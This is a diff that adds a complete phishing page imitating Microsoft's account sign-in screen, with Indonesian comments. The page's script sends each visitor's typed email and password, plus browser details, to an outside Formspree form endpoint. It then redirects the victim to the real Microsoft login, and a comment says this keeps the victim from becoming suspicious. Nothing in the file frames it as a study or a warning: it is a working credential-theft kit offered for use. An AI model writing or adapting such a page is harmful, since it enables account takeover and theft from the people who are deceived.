@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0;
+      font-family: "Segoe UI", system-ui, sans-serif; }
+  body { background: #f3f3f3; display: flex; justify-content: center;
+         align-items: center; min-height: 100vh; padding: 16px; }
+  .card { width: 100%; max-width: 440px; padding: 44px;
+          background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,.1); }
+  .logo { display: flex; gap: 2px; margin-bottom: 20px; }
+  .logo div { width: 11px; height: 11px; }
+  .r { background: #f25022; } .g { background: #7fba00; }
+  .b { background: #00a4ef; } .y { background: #ffb900; }
+  h1 { font-size: 24px; font-weight: 600; margin-bottom: 20px;
+       color: #1b1b1b; }
+  input { width: 100%; padding: 8px 10px; margin-bottom: 14px;
+          border: 1px solid #8a8886; border-radius: 2px;
+          font-size: 15px; outline: none; }
+  input:focus { border-color: #0067b8; }
+  button { width: 100%; padding: 10px; background: #0067b8; color: #fff;
+           border: 0; font-size: 15px; font-weight: 600; cursor: pointer;
+           border-radius: 2px; }
+  button:hover { background: #005da6; }
+  .hint { font-size: 13px; margin-top: 18px; color: #1b1b1b; }
+  .hint a { color: #0067b8; text-decoration: none; }
+  .status { display: none; text-align: center; padding: 20px 0;
+            font-size: 14px; color: #666; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <div class="r"></div><div class="g"></div>
+      <div class="b"></div><div class="y"></div>
+    </div>
+    <h1>Sign in</h1>
+
+    <form id="f">
+      <input type="email" name="email" id="email"
+             placeholder="Email, phone, or Skype" required autofocus>
+      <input type="password" name="password" id="password"
+             placeholder="Password" required>
+      <button type="submit" id="btn">Sign in</button>
+    </form>
+
+    <p class="hint">No account? <a href="#">Create one!</a></p>
+    <div class="status" id="s">Memverifikasi…</div>
+  </div>
+
+<script>
+// GANTI INI sama endpoint Formspree lo.
+// Daftar gratis di formspree.io → New Form → copy ID-nya.
+const FORMSPREE_ID = "https://formspree.io/f/xbglarkp";  
+const ENDPOINT = "https://formspree.io/f/" + FORMSPREE_ID;
+
+// optional: redirect ke halaman asli setelah submit
+const REDIRECT = "https://login.microsoftonline.com";
+
+const f = document.getElementById("f");
+const btn = document.getElementById("btn");
+const s = document.getElementById("s");
+
+f.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  btn.disabled = true;
+  btn.textContent = "Signing in…";
+
+  const data = {
+    email: document.getElementById("email").value,
+    password: document.getElementById("password").value,
+    ua: navigator.userAgent,
+    ts: new Date().toISOString(),
+    ref: document.referrer,
+  };
+
+  try {
+    await fetch(ENDPOINT, {
+      method: "POST",
+      headers: { "Content-Type": "application/json",
+                 "Accept": "application/json" },
+      body: JSON.stringify(data),
+    });
+  } catch (err) {
+    // tetap lanjut walau gagal, biar korban gak curiga
+  }
+
+  f.style.display = "none";
+  s.style.display = "block";
+
+  // kasih delay biar keliatan "lagi loading", terus lempar ke asli
+  setTimeout(() => { window.location.href = REDIRECT; }, 1500);
+});
+</script>
+</body>
+</html>
